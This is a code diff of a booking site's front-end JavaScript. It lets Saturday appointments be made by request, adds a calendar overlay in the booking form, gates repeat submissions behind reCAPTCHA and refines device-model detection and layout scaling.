     let calendarAutoRefreshQueued = false;
     let calendarAutoRefreshLastAt = 0;
     let dailyMidnightReloadTimer = null;
+    let isFormCalendarOverlayActive = false;
+    let calendarScaleWrapperHomeParent = null;
+    let calendarScaleWrapperHomeNextSibling = null;
 
     const CALENDAR_CACHE_STORAGE_KEY = 'hd_calendar_cache_v2';
     const CALENDAR_CACHE_DAY_MARKER_KEY = 'hd_calendar_cache_day_v1';
@@ -4805,6 +5173,8 @@
     const CALENDAR_CACHE_MAX_MONTHS = 18;
     const CALENDAR_PREFETCH_MONTHS_AHEAD = 2;
     const CALENDAR_AUTO_REFRESH_INTERVAL_MS = 20 * 60 * 1000;
+    const CALENDAR_BASE_WIDTH_PX = 656;
+    const CALENDAR_SCALE_BOTTOM_BUFFER_PX = 30;
     const SLOT_SPARKLE_MIN_DELAY_MS = 5000;
     const SLOT_SPARKLE_MAX_DELAY_MS = 15000;
     const SLOT_SPARKLE_DURATION_MS = 360;
@@ -5035,7 +5405,12 @@
 
         // Remove known local/session state so next load is fresh.
         try { localStorage.removeItem('bookingFormData'); } catch (e) {}
+        let footerFingerUsedSnapshot = '';
+        try { footerFingerUsedSnapshot = String(sessionStorage.getItem(FOOTER_FINGER_SESSION_USED_KEY) || ''); } catch (e) {}
         try { sessionStorage.clear(); } catch (e) {}
+        if (footerFingerUsedSnapshot === '1') {
+            try { sessionStorage.setItem(FOOTER_FINGER_SESSION_USED_KEY, '1'); } catch (e) {}
+        }
     }
 
     function markHardReloadAfterModalClose() {
@@ -5165,7 +5540,7 @@
             date.setHours(0, 0, 0, 0);
             const dow = date.getDay();
             if (date < minDate) return;
-            if (dow === 0 || dow === 6) return;
+            if (dow === 0) return;
             if (!daysMap.has(day)) daysMap.set(day, true);
         });
 
@@ -5191,7 +5566,8 @@
             const month = monthCursor.getMonth();
             await fetchMonth(year, month, false, false);
 
-            const days = getAvailableDaysForMonth(year, month);
+            const days = getAvailableDaysForMonth(year, month)
+                .filter(d => new Date(year, month, d).getDay() !== 6);
             if (!days.length) continue;
 
             let candidateDay = null;
@@ -5252,14 +5628,23 @@
     }
 
     function getAdjacentRenderedAvailableDayEl(direction) {
-        const availableEls = Array.from(document.querySelectorAll('.cal-day.cal-day--has-slots'));
-        if (!availableEls.length) return null;
-
-        availableEls.sort((a, b) => Number(a.dataset.day) - Number(b.dataset.day));
-
         const renderedYear = Number(calGrid?.dataset.year);
         const renderedMonth = Number(calGrid?.dataset.month);
         const hasRenderedMeta = Number.isFinite(renderedYear) && Number.isFinite(renderedMonth);
+        const fallbackYear = currentDate instanceof Date ? currentDate.getFullYear() : 0;
+        const fallbackMonth = currentDate instanceof Date ? currentDate.getMonth() : 0;
+        const effectiveYear = hasRenderedMeta ? renderedYear : fallbackYear;
+        const effectiveMonth = hasRenderedMeta ? renderedMonth : fallbackMonth;
+
+        const availableEls = Array.from(document.querySelectorAll('.cal-day.cal-day--has-slots'))
+            .filter(el => {
+                const dayNum = Number(el.dataset.day);
+                if (!Number.isFinite(dayNum)) return false;
+                return new Date(effectiveYear, effectiveMonth, dayNum).getDay() !== 6;
+            });
+        if (!availableEls.length) return null;
+
+        availableEls.sort((a, b) => Number(a.dataset.day) - Number(b.dataset.day));
 
         const sameMonthSelection = selectedDate && hasRenderedMeta &&
             selectedDate.getFullYear() === renderedYear &&
@@ -5286,6 +5671,9 @@
         const isEnabled = Boolean(enabled);
         prevBtn.disabled = !isEnabled;
         prevBtn.setAttribute('aria-disabled', String(!isEnabled));
+        prevBtn.style.visibility = isEnabled ? 'visible' : 'hidden';
+        prevBtn.style.pointerEvents = isEnabled ? 'auto' : 'none';
+        prevBtn.setAttribute('aria-hidden', String(!isEnabled));
     }
 
     async function refreshCalendarPrevButtonState() {
@@ -5307,6 +5695,9 @@
             return;
         }
 
+        // Hide immediately while async backward scan runs, so rapid day-switching
+        // does not leave a stale visible "back" button.
+        setCalendarPrevButtonEnabled(false);
         const prevAvailable = await findAdjacentAvailableDate(-1);
         if (runId !== calendarPrevButtonStateRunId) return;
         setCalendarPrevButtonEnabled(Boolean(prevAvailable));
@@ -5367,14 +5758,14 @@
             }
         });
 
-        // Find nearest free weekday
+        // Find nearest free day (excluding Sunday)
         let nearestDay = null;
         absoluteNearestDate = null;
         nearestSlotData = null;
         nearestDayLastSlotData = null;
         for (const d of Object.keys(slotsMap).map(Number).sort((a,b)=>a-b)) {
             const date = new Date(year, month, d);
-            if (date >= minDate && date.getDay() !== 0 && date.getDay() !== 6) {
+            if (date >= minDate && date.getDay() !== 0) {
                 const free = slotsMap[d].filter(s => s.status !== 'busy');
                 if (free.length) {
                     nearestDay = d;
@@ -5449,7 +5840,7 @@
             const isToday  = date.getTime() === torNow.getTime();
 
             if (isSaturday) {
-                el.innerHTML = `<span class="cal-key" aria-hidden="true" style="color:#ffffff; opacity:0.96;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="3.5"></circle><path d="M11 15.5h10M18 15.5v3M15 15.5v2"></path></svg></span>`;
+                el.innerHTML = `<span class="cal-key" aria-hidden="true" style="color:#ffffff; opacity:0.96;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="8" r="3.5"></circle><path d="M11 10.6l8.2 8.2M16.4 15.2l1.9-1.9M18.3 17.1l1.7-1.7"></path></svg></span>`;
             } else {
                 el.textContent = day;
             }
@@ -5458,15 +5849,13 @@
 
             if (isPast || isSunday) {
                 el.classList.add('cal-day--disabled');
-            } else if (isSaturday) {
-                el.classList.add('cal-day--closed');
-                el.onclick = () => selectClosedSaturday(day, el);
             } else if (slotsMap[day]) {
                 const allBusy = slotsMap[day].every(s => s.status === 'busy');
                 if (allBusy) {
                     el.classList.add('cal-day--busy', 'cal-day--disabled');
                 } else {
                     el.classList.add('cal-day--has-slots');
+                    if (day === nearestDay) el.classList.add('cal-day--nearest');
                     el.style.setProperty('--i', availableDaysCount++);
                     el.dataset.slots = JSON.stringify(slotsMap[day]);
                     el.onclick = () => selectDay(day, el);
@@ -5485,6 +5874,9 @@
                         setTimeout(() => selectDay(day, el, true), 200);
                     }
                 }
+            } else if (isSaturday) {
+                el.classList.add('cal-day--closed');
+                el.onclick = () => selectClosedSaturday(day, el);
             } else {
                 el.classList.add('cal-day--disabled');
             }
@@ -5519,7 +5911,7 @@
                     const minDate = getMinBookableDate();
                     for (const slot of nextSlots.filter(s => s.status !== 'busy').sort((a,b)=>a.date-b.date)) {
                         const d = new Date(nextY, nextM, slot.date);
-                        if (d >= minDate && d.getDay() !== 0 && d.getDay() !== 6) {
+                        if (d >= minDate && d.getDay() !== 0) {
                             absoluteNearestDate = d;
                             nearestSlotData = slot;
                             nearestDayLastSlotData = slot;
@@ -5671,11 +6063,56 @@
     // ------------------------------------------------------------------
     // SELECT DAY -> show slots
     // ------------------------------------------------------------------
+    function getSlotStartMinutes(slot) {
+        if (!slot) return -1;
+
+        const isoRaw = String(slot.iso || '');
+        const isoMatch = isoRaw.match(/T(\d{2}):(\d{2})/);
+        if (isoMatch) {
+            const h = Number(isoMatch[1]);
+            const m = Number(isoMatch[2]);
+            if (Number.isFinite(h) && Number.isFinite(m)) {
+                return h * 60 + m;
+            }
+        }
+
+        const textRaw = String(slot.text || '');
+        const startText = textRaw.split(/[-\u2013]/)[0].trim();
+        const textMatch = startText.match(/^(\d{1,2})(?::(\d{2}))?\s*(AM|PM)?$/i);
+        if (!textMatch) return -1;
+
+        let hour = Number(textMatch[1]);
+        const minute = Number(textMatch[2] || '0');
+        const ampm = String(textMatch[3] || '').toUpperCase();
+        if (!Number.isFinite(hour) || !Number.isFinite(minute)) return -1;
+
+        if (ampm === 'PM' && hour < 12) hour += 12;
+        if (ampm === 'AM' && hour === 12) hour = 0;
+
+        return hour * 60 + minute;
+    }
+
+    function getLatestSlot(slots) {
+        if (!Array.isArray(slots) || !slots.length) return null;
+        let best = slots[0];
+        let bestMinutes = getSlotStartMinutes(best);
+        for (let i = 1; i < slots.length; i++) {
+            const current = slots[i];
+            const currentMinutes = getSlotStartMinutes(current);
+            if (currentMinutes > bestMinutes) {
+                best = current;
+                bestMinutes = currentMinutes;
+            }
+        }
+        return best;
+    }
+
     function selectDay(day, el, isAuto = false) {
         document.querySelectorAll('.cal-day').forEach(d => d.classList.remove('cal-day--selected'));
         el.classList.add('cal-day--selected');
 
         selectedDate = new Date(currentDate.getFullYear(), currentDate.getMonth(), day);
+        const isSaturdaySelection = selectedDate.getDay() === 6;
         logEvent('Date Selected', selectedDate.toDateString());
 
         // Update nav title
@@ -5683,13 +6120,22 @@
 
         const raw = el.dataset.slots ? JSON.parse(el.dataset.slots) : [];
         const free = raw.filter(s => s.status !== 'busy');
+        const latestSlot = getLatestSlot(free);
 
         // Label
-        slotsDayDisplay.textContent = free.length ? 'CHOOSE TIME:' : 'No available slots for this day.';
+        slotsDayDisplay.textContent = free.length
+            ? (isSaturdaySelection ? 'CHOOSE TIME (SATURDAY BY REQUEST):' : 'CHOOSE TIME:')
+            : 'No available slots for this day.';
         slotsDayDisplay.style.opacity = '1';
 
         // Build slot buttons
         slotsGrid.innerHTML = '';
+        if (isSaturdaySelection && free.length) {
+            const warningEl = document.createElement('p');
+            warningEl.className = 'slots-saturday-warning';
+            warningEl.textContent = 'Saturday appointments are available only by request.';
+            slotsGrid.appendChild(warningEl);
+        }
         free.forEach((slot, idx) => {
             const btn = document.createElement('button');
             btn.className = 'slot-btn slot-btn--hypnotic';
@@ -5699,7 +6145,14 @@
             btn.innerHTML = `<div class="slot-icon-wrapper">${svg}</div><div class="slot-time"><span style="font-weight: 800">${t} - ${end}</span></div>`;
             btn.style.setProperty('--i', availableDaysCount + idx);
             btn.style.setProperty('--slot-idx', idx);
-            btn.onclick = () => { btn.classList.add('slot-btn--clicked'); setTimeout(() => stageBookingAfterIntake(slot), 600); };
+            btn.onclick = () => {
+                btn.classList.add('slot-btn--clicked');
+                if (isFormCalendarOverlayActive && modal && modal.classList.contains('modal--active')) {
+                    setTimeout(() => applySlotFromCalendarOverlay(slot), 360);
+                    return;
+                }
+                setTimeout(() => stageBookingAfterIntake(slot), 600);
+            };
             slotsGrid.appendChild(btn);
         });
 
@@ -5713,17 +6166,25 @@
         }
         startSlotSparkleLoop();
         refreshCalendarPrevButtonState().catch(() => setCalendarPrevButtonEnabled(false));
+
+        if (!isAuto && latestSlot) {
+            if (isFormCalendarOverlayActive && modal && modal.classList.contains('modal--active')) {
+                setTimeout(() => applySlotFromCalendarOverlay(latestSlot), 120);
+            } else {
+                setTimeout(() => stageBookingAfterIntake(latestSlot), 120);
+            }
+        }
     }
 
     function selectClosedSaturday(day, el) {
         document.querySelectorAll('.cal-day').forEach(d => d.classList.remove('cal-day--selected'));
         selectedDate = new Date(currentDate.getFullYear(), currentDate.getMonth(), day);
-        logEvent('Closed Saturday Clicked', selectedDate.toDateString());
+        logEvent('Saturday By Request Clicked', selectedDate.toDateString());
 
         setCalendarInnerTitle(selectedDate);
-        slotsDayDisplay.textContent = 'SATURDAY IS CLOSED';
+        slotsDayDisplay.textContent = 'SATURDAY: BY REQUEST ONLY';
         slotsDayDisplay.style.opacity = '1';
-        slotsGrid.innerHTML = `<p style="grid-column:1/-1;text-align:center;color:#fff;font-weight: 800;font-size:1.1rem;margin-top:16px">This day is closed.<br>Please choose another day.</p>`;
+        slotsGrid.innerHTML = `<p style="grid-column:1/-1;text-align:center;color:#fff;font-weight:800;font-size:1.1rem;margin-top:16px">Saturday appointments are available only by request.<br>Please call to confirm availability.</p>`;
         slotsBlock.style.display = 'block';
         stopSlotSparkleLoop();
         refreshCalendarPrevButtonState().catch(() => setCalendarPrevButtonEnabled(false));
@@ -5812,25 +6273,41 @@
     }
 
     function detectDeviceModel() {
+        const normalizeModel = (value) => String(value || "").replace(/\s+/g, " ").trim();
         try {
-            if (navigator.userAgentData && typeof navigator.userAgentData.model === "string" && navigator.userAgentData.model.trim()) {
-                return navigator.userAgentData.model.trim();
+            if (navigator.userAgentData && typeof navigator.userAgentData.model === "string") {
+                const hintedModel = normalizeModel(navigator.userAgentData.model);
+                if (hintedModel && hintedModel.toLowerCase() !== "unknown") return hintedModel;
             }
         } catch (e) {}
 
         const ua = String(navigator.userAgent || "");
+        const androidMatch = ua.match(/Android[^;]*;\s*([^;)]*?)\s+Build\//i);
+        if (androidMatch && androidMatch[1]) {
+            const model = normalizeModel(androidMatch[1].replace(/\bwv\b/ig, ""));
+            if (model && !/^(linux|u|android)$/i.test(model)) return model;
+        }
+
+        const samsungMatch = ua.match(/\b(SM-[A-Z0-9]+)\b/i);
+        if (samsungMatch && samsungMatch[1]) return samsungMatch[1].toUpperCase();
+
+        const pixelMatch = ua.match(/\b(Pixel(?:\s+[A-Za-z0-9]+){1,3})\b/i);
+        if (pixelMatch && pixelMatch[1]) return normalizeModel(pixelMatch[1]);
+
+        const xiaomiMatch = ua.match(/\b((?:MI|Redmi|POCO)\s*[A-Za-z0-9-]+)\b/i);
+        if (xiaomiMatch && xiaomiMatch[1]) return normalizeModel(xiaomiMatch[1]);
+
         if (/iPhone/i.test(ua)) return "iPhone";
         if (/iPad/i.test(ua)) return "iPad";
         if (/iPod/i.test(ua)) return "iPod";
-
-        const androidMatch = ua.match(/Android[^;]*;\s*([^;)]*?)\s+Build\//i);
-        if (androidMatch && androidMatch[1]) {
-            return androidMatch[1].trim();
-        }
-
-        if (/Android/i.test(ua)) return "Android Device";
-        if (/Mobile/i.test(ua)) return "Mobile Device";
-        return "Desktop";
+        if (/Windows NT/i.test(ua)) return "Windows PC";
+        if (/Macintosh|Mac OS X/i.test(ua)) return "Mac";
+        if (/CrOS/i.test(ua)) return "Chromebook";
+        if (/Linux/i.test(ua)) return "Linux PC";
+        if (/Android/i.test(ua)) return "Android (model unavailable)";
+        if (/Mobile/i.test(ua)) return "Mobile (model unavailable)";
+        const os = detectOsLabel();
+        return os ? `${os} device` : "Unknown device";
     }
 
     function extractCityFromTimezone(timezone) {
@@ -5870,6 +6347,7 @@
             touchPoints: Number.isFinite(navigator.maxTouchPoints) ? navigator.maxTouchPoints : 0,
             colorDepth: Number.isFinite(window.screen.colorDepth) ? window.screen.colorDepth : "",
             pageUrl: window.location.href,
+            userAgent: String(navigator.userAgent || ""),
             referrer: document.referrer || ""
         };
     }
@@ -5939,6 +6417,7 @@
                     touchPoints: ctx.touchPoints,
                     colorDepth: ctx.colorDepth,
                     pageUrl: ctx.pageUrl,
+                    userAgent: ctx.userAgent,
                     referrer: ctx.referrer,
                     perfLoadPercent: getExtra("perfLoadPercent"),
                     perfProcess: getExtra("perfProcess"),
@@ -6167,6 +6646,7 @@
         attachFormAutoSave();
         initAutoGrowTextareas();
         initAgePlaceholderBehavior();
+        initProvinceInputBehavior();
         initFaqSpoilers();
         initFooterFingerHint();
         
@@ -6192,6 +6672,12 @@
         const termsCheckbox = document.getElementById('agreeTerms');
         const bookingFormEl = document.getElementById('bookingForm');
         if (bookingFormEl) bookingFormEl.noValidate = true;
+        const bookingNameInputEl = bookingFormEl ? bookingFormEl.querySelector('input[name="name"]') : null;
+        if (bookingNameInputEl && !bookingNameInputEl.dataset.xBindP7) {
+            bookingNameInputEl.dataset.xBindP7 = '1';
+            bookingNameInputEl.addEventListener('input', () => m1Queue(320));
+            bookingNameInputEl.addEventListener('blur', () => m1Sync());
+        }
         const confirmBookingBtnEl = document.getElementById('confirmBookingBtn');
         if (bookingFormEl && confirmBookingBtnEl && !confirmBookingBtnEl.dataset.submitBound) {
             confirmBookingBtnEl.dataset.submitBound = '1';
@@ -6237,39 +6723,33 @@
     });
 
     /**
-     * Downscales the calendar section on small screens so proportions
-     * look exactly like on the reference (desktop/loaded) image.
-     * On wide screens no scaling is applied (scale = 1).
+     * Scales the entire calendar block (layout + typography + controls)
+     * from one desktop baseline width so all elements shrink together.
      */
     function scaleCalendar() {
         const inner = document.getElementById('calendarScaleInner');
         const wrapper = document.getElementById('calendarScaleWrapper');
         if (!inner || !wrapper) return;
 
-        // Reset first to measure the natural width
-        inner.style.transform = '';
-        inner.style.width = '';
+        // Measure baseline height at fixed desktop width.
+        inner.style.transform = 'scale(1)';
+        inner.style.width = `${CALENDAR_BASE_WIDTH_PX}px`;
+        inner.style.transformOrigin = 'top left';
+        inner.style.marginLeft = '0px';
         wrapper.style.height = '';
+        wrapper.style.minHeight = '';
 
-        // Natural width of the calendar block (what it would be without scaling)
-        const naturalWidth = inner.scrollWidth;
-        // Available screen width (accounting for body padding/margin)
-        const availableWidth = wrapper.offsetWidth;
+        const baselineHeight = inner.scrollHeight;
+        const availableWidth = wrapper.clientWidth || wrapper.offsetWidth;
+        if (!availableWidth || !baselineHeight) return;
 
-        if (naturalWidth > availableWidth && availableWidth > 0) {
-            const scale = availableWidth / naturalWidth;
-            inner.style.transform = `scale(${scale})`;
-            inner.style.transformOrigin = 'top left';
-            inner.style.width = (naturalWidth) + 'px';
-            // Collapse the wrapper to the scaled height so nothing below is pushed down
-            // Increased buffer from 10px to 30px to prevent bottom border clipping
-            const naturalHeight = inner.scrollHeight;
-            wrapper.style.height = (naturalHeight * scale + 30) + 'px';
-        } else {
-            inner.style.transform = 'scale(1)';
-            inner.style.width = '';
-            wrapper.style.height = '';
-        }
+        const scale = Math.min(1, availableWidth / CALENDAR_BASE_WIDTH_PX);
+        inner.style.transform = `scale(${scale})`;
+        const scaledWidth = CALENDAR_BASE_WIDTH_PX * scale;
+        const horizontalOffset = Math.max(0, (availableWidth - scaledWidth) / 2);
+        inner.style.marginLeft = `${horizontalOffset}px`;
+        wrapper.style.height = `${(baselineHeight * scale) + CALENDAR_SCALE_BOTTOM_BUFFER_PX}px`;
+        wrapper.style.minHeight = `${(baselineHeight * scale) + CALENDAR_SCALE_BOTTOM_BUFFER_PX}px`;
     }
 
     // Re-scale on window resize (orientation change etc.)
@@ -6343,24 +6823,249 @@
     let footerFingerAutoPressPending = false;
     let footerFingerAutoPressCooldownUntil = 0;
     let footerFingerBottomLatch = false;
+    let footerFingerUsedThisSession = false;
     const FOOTER_FINGER_AUTO_PRESS_DELAY_MS = 760;
     const FOOTER_FINGER_AUTO_PRESS_COOLDOWN_MS = 20000;
+    const FOOTER_FINGER_SESSION_USED_KEY = 'hd_footer_finger_used_v1';
+    let bookingRecaptchaWidgetId = null;
+    let bookingRecaptchaToken = '';
+    let bookingRecaptchaTokenIssuedAt = 0;
 
     function isSecretTestBypassReady(form) {
         if (!secretTestModeEnabled || !form) return false;
         return normalizeSingleLine(form.name?.value) === '1';
     }
 
-    function getConfirmBtnLabel() {
-        return secretTestModeEnabled ? 'Book Now [TEST]' : 'Book Now';
+    // Backward-compatible alias for older submit handlers/cached bundles.
+    function isSecretBypassReady(form) {
+        return isSecretTestBypassReady(form);
     }
 
-    function setBookingNotice(message) {
+    function getConfirmBtnLabel() {
+        return secretTestModeEnabled ? 'BOOK NOW [TEST]' : 'BOOK NOW';
+    }
+
+    function readFooterFingerUsedSessionFlag() {
+        try {
+            return sessionStorage.getItem(FOOTER_FINGER_SESSION_USED_KEY) === '1';
+        } catch (e) {
+            return false;
+        }
+    }
+
+    function markFooterFingerUsedForSession() {
+        if (footerFingerUsedThisSession) return;
+        footerFingerUsedThisSession = true;
+        try {
+            sessionStorage.setItem(FOOTER_FINGER_SESSION_USED_KEY, '1');
+        } catch (e) {}
+        clearFooterFingerAutoPressTimer();
+        const hint = document.getElementById('footerFingerHint');
+        if (hint) {
+            hint.classList.remove('footer-finger-hint--active');
+            hint.classList.remove('footer-finger-hint--pressing');
+        }
+        scheduleFooterFingerHintStateUpdate();
+    }
+
+    function getBookingRecaptchaWrap() {
+        return document.getElementById('bookingRecaptchaWrap');
+    }
+
+    function clearBookingRecaptchaToken() {
+        bookingRecaptchaToken = '';
+        bookingRecaptchaTokenIssuedAt = 0;
+    }
+
+    function isBookingRecaptchaTokenFresh() {
+        return Boolean(bookingRecaptchaToken) && (Date.now() - bookingRecaptchaTokenIssuedAt) <= RECAPTCHA_TOKEN_TTL_MS;
+    }
+
+    function setBookingRecaptchaVisible(visible) {
+        const wrap = getBookingRecaptchaWrap();
+        if (!wrap) return;
+        wrap.style.display = visible ? 'block' : 'none';
+        if (!visible) {
+            wrap.classList.remove('field-invalid');
+        }
+    }
+
+    function resetBookingRecaptchaUi() {
+        clearBookingRecaptchaToken();
+        setBookingRecaptchaVisible(false);
+        if (bookingRecaptchaWidgetId !== null && window.grecaptcha && typeof window.grecaptcha.reset === 'function') {
+            try { window.grecaptcha.reset(bookingRecaptchaWidgetId); } catch (e) {}
+        }
+    }
+
+    function waitForRecaptchaApiReady(timeoutMs = 7000) {
+        if (window.__recaptchaApiReady && window.grecaptcha && typeof window.grecaptcha.render === 'function') {
+            return Promise.resolve(true);
+        }
+        return new Promise((resolve) => {
+            let settled = false;
+            const finish = (value) => {
+                if (settled) return;
+                settled = true;
+                clearTimeout(timer);
+                window.removeEventListener('recaptcha-ready', onReady);
+                resolve(Boolean(value));
+            };
+            const onReady = () => {
+                finish(window.grecaptcha && typeof window.grecaptcha.render === 'function');
+            };
+            const timer = setTimeout(() => finish(false), timeoutMs);
+            window.addEventListener('recaptcha-ready', onReady);
+        });
+    }
+
+    function getRepeatBookingGuardStore() {
+        try {
+            const raw = localStorage.getItem(REPEAT_BOOKING_GUARD_STORAGE_KEY);
+            if (!raw) return {};
+            const parsed = JSON.parse(raw);
+            if (!parsed || typeof parsed !== 'object') return {};
+            return parsed;
+        } catch (e) {
+            return {};
+        }
+    }
+
+    function setRepeatBookingGuardStore(store) {
+        try {
+            localStorage.setItem(REPEAT_BOOKING_GUARD_STORAGE_KEY, JSON.stringify(store || {}));
+        } catch (e) {}
+    }
+
+    function normalizeRepeatIdentity(source) {
+        const readField = (fieldName) => {
+            if (!source) return '';
+            if (typeof source.get === 'function') return source.get(fieldName);
+            return source[fieldName];
+        };
+        const email = normalizeSingleLine(readField('email')).toLowerCase();
+        const phone = normalizeSingleLine(readField('phone')).replace(/\D/g, '');
+        if (!email && !phone) return '';
+        return `${email}|${phone}`;
+    }
+
+    function hasPreviousSubmissionForIdentity(identityKey) {
+        if (!identityKey) return false;
+        const store = getRepeatBookingGuardStore();
+        return Boolean(store[identityKey]);
+    }
+
+    function markSubmissionIdentity(identityKey) {
+        if (!identityKey) return;
+        const now = Date.now();
+        const store = getRepeatBookingGuardStore();
+        const current = store[identityKey] || { count: 0, lastSubmittedAt: 0 };
+        store[identityKey] = {
+            count: Number(current.count || 0) + 1,
+            lastSubmittedAt: now
+        };
+
+        // Keep storage small: retain only the latest 100 identities.
+        const entries = Object.entries(store).sort((a, b) => Number((b[1] || {}).lastSubmittedAt || 0) - Number((a[1] || {}).lastSubmittedAt || 0));
+        const trimmed = {};
+        entries.slice(0, 100).forEach(([key, value]) => {
+            trimmed[key] = value;
+        });
+        setRepeatBookingGuardStore(trimmed);
+    }
+
+    function handleBookingRecaptchaSolved(token) {
+        bookingRecaptchaToken = String(token || '').trim();
+        bookingRecaptchaTokenIssuedAt = bookingRecaptchaToken ? Date.now() : 0;
+        const wrap = getBookingRecaptchaWrap();
+        if (wrap) wrap.classList.remove('field-invalid');
+        if (bookingStatus && /reCAPTCHA/i.test(String(bookingStatus.textContent || ''))) {
+            clearBookingError();
+        }
+    }
+
+    function handleBookingRecaptchaExpired() {
+        clearBookingRecaptchaToken();
+    }
+
+    function handleBookingRecaptchaError() {
+        clearBookingRecaptchaToken();
+    }
+
+    async function ensureRepeatSubmissionCaptcha(identityKey) {
+        if (!identityKey || !hasPreviousSubmissionForIdentity(identityKey)) {
+            setBookingRecaptchaVisible(false);
+            clearBookingRecaptchaToken();
+            return { required: false, passed: true };
+        }
+
+        setBookingRecaptchaVisible(true);
+        const wrap = getBookingRecaptchaWrap();
+        if (wrap) wrap.classList.remove('field-invalid');
+
+        if (!RECAPTCHA_SITE_KEY || RECAPTCHA_SITE_KEY === 'YOUR_RECAPTCHA_SITE_KEY') {
+            setBookingError('reCAPTCHA is not configured. Add your site key first.', wrap);
+            return { required: true, passed: false };
+        }
+
+        const apiReady = await waitForRecaptchaApiReady();
+        if (!apiReady || !window.grecaptcha || typeof window.grecaptcha.render !== 'function') {
+            setBookingError('reCAPTCHA is loading. Please wait and submit again.', wrap);
+            return { required: true, passed: false };
+        }
+
+        if (bookingRecaptchaWidgetId === null) {
+            const widgetHost = document.getElementById('bookingRecaptchaWidget');
+            if (!widgetHost) {
+                setBookingError('reCAPTCHA container is missing.', wrap);
+                return { required: true, passed: false };
+            }
+            try {
+                bookingRecaptchaWidgetId = window.grecaptcha.render(widgetHost, {
+                    sitekey: RECAPTCHA_SITE_KEY,
+                    theme: 'light',
+                    size: 'normal',
+                    callback: handleBookingRecaptchaSolved,
+                    'expired-callback': handleBookingRecaptchaExpired,
+                    'error-callback': handleBookingRecaptchaError
+                });
+            } catch (err) {
+                setBookingError('Could not initialize reCAPTCHA. Reload and try again.', wrap);
+                return { required: true, passed: false };
+            }
+        }
+
+        if (!isBookingRecaptchaTokenFresh()) {
+            if (bookingRecaptchaWidgetId !== null && window.grecaptcha && typeof window.grecaptcha.reset === 'function') {
+                try { window.grecaptcha.reset(bookingRecaptchaWidgetId); } catch (e) {}
+            }
+            clearBookingRecaptchaToken();
+            setBookingError('Please complete reCAPTCHA to submit a repeated request.', wrap);
+            return { required: true, passed: false };
+        }
+
+        return { required: true, passed: true };
+    }
+
+    function normalizeBookingStatusTone(tone) {
+        const normalized = String(tone || '').toLowerCase();
+        if (normalized === 'error' || normalized === 'warning' || normalized === 'success') return normalized;
+        return 'success';
+    }
+
+    function setBookingNotice(message, tone = 'success') {
         if (!bookingStatus) return;
+        const safeTone = normalizeBookingStatusTone(tone);
         bookingStatus.textContent = String(message || '');
-        bookingStatus.classList.remove('status-alert--visible');
+        bookingStatus.classList.remove('status-alert--visible', 'status-alert--success', 'status-alert--warning', 'status-alert--error');
         void bookingStatus.offsetWidth;
-        if (bookingStatus.textContent) bookingStatus.classList.add('status-alert--visible');
+        if (bookingStatus.textContent) {
+            bookingStatus.classList.add(`status-alert--${safeTone}`, 'status-alert--visible');
+        }
+    }
+
+    function setBookingWarning(message) {
+        setBookingNotice(message, 'warning');
     }
 
     function applySecretTestModeUI() {
@@ -6370,7 +7075,7 @@
     }
 
     function isFooterBookBtnReady() {
-        const btn = document.getElementById('footerBookBtn');
+        const btn = document.getElementById('headerBookBtn');
         if (!btn) return false;
         const style = window.getComputedStyle(btn);
         return (
@@ -6385,8 +7090,78 @@
         return !!(cameraCaptureModal && cameraCaptureModal.classList.contains('camera-capture-modal--active'));
     }
 
+    function isFormCalendarOverlayOpen() {
+        const overlay = document.getElementById('formCalendarOverlay');
+        return !!(overlay && overlay.classList.contains('form-calendar-overlay--active'));
+    }
+
     function isAnyModalOpen() {
-        return !!document.querySelector('.modal.modal--active') || isCameraCaptureModalOpen();
+        return !!document.querySelector('.modal.modal--active') || isCameraCaptureModalOpen() || isFormCalendarOverlayOpen();
+    }
+
+    function openFormCalendarOverlay() {
+        if (!modal || !modal.classList.contains('modal--active')) return;
+        const overlay = document.getElementById('formCalendarOverlay');
+        const mount = document.getElementById('formCalendarOverlayMount');
+        const calendarWrapper = document.getElementById('calendarScaleWrapper');
+        if (!overlay || !mount || !calendarWrapper) return;
+        if (overlay.classList.contains('form-calendar-overlay--active')) return;
+
+        calendarScaleWrapperHomeParent = calendarWrapper.parentNode;
+        calendarScaleWrapperHomeNextSibling = calendarWrapper.nextSibling;
+
+        mount.appendChild(calendarWrapper);
+        overlay.classList.add('form-calendar-overlay--active');
+        overlay.setAttribute('aria-hidden', 'false');
+        isFormCalendarOverlayActive = true;
+
+        document.body.style.overflow = 'hidden';
+        document.body.classList.add('modal-is-open');
+        scheduleFooterFingerHintStateUpdate();
+
+        if (selectedDate instanceof Date && !Number.isNaN(selectedDate.getTime())) {
+            currentDate = new Date(selectedDate.getFullYear(), selectedDate.getMonth(), 1);
+        }
+
+        requestAnimationFrame(() => {
+            scaleCalendar();
+            renderCalendar().catch(() => {});
+        });
+    }
+
+    function closeFormCalendarOverlay() {
+        const overlay = document.getElementById('formCalendarOverlay');
+        const calendarWrapper = document.getElementById('calendarScaleWrapper');
+        if (!overlay || !overlay.classList.contains('form-calendar-overlay--active')) return;
+
+        overlay.classList.remove('form-calendar-overlay--active');
+        overlay.setAttribute('aria-hidden', 'true');
+        isFormCalendarOverlayActive = false;
+
+        if (calendarWrapper && calendarScaleWrapperHomeParent) {
+            if (
+                calendarScaleWrapperHomeNextSibling &&
+                calendarScaleWrapperHomeNextSibling.parentNode === calendarScaleWrapperHomeParent
+            ) {
+                calendarScaleWrapperHomeParent.insertBefore(calendarWrapper, calendarScaleWrapperHomeNextSibling);
+            } else {
+                calendarScaleWrapperHomeParent.appendChild(calendarWrapper);
+            }
+        }
+        calendarScaleWrapperHomeParent = null;
+        calendarScaleWrapperHomeNextSibling = null;
+
+        if (modal && modal.classList.contains('modal--active')) {
+            document.body.style.overflow = 'hidden';
+            document.body.classList.add('modal-is-open');
+        } else if (!document.querySelector('.modal.modal--active') && !isCameraCaptureModalOpen()) {
+            document.body.style.overflow = 'auto';
+            document.body.classList.remove('modal-is-open');
+        }
+
+        requestAnimationFrame(scaleCalendar);
+        scheduleFooterFingerHintStateUpdate();
+        maybeTriggerHardReloadAfterLastModalClosed();
     }
 
     function maybeTriggerHardReloadAfterLastModalClosed() {
@@ -6412,14 +7187,17 @@
     function shouldAnimateFooterFingerHint() {
         const hint = document.getElementById('footerFingerHint');
         if (!hint) return false;
+        if (footerFingerUsedThisSession) return false;
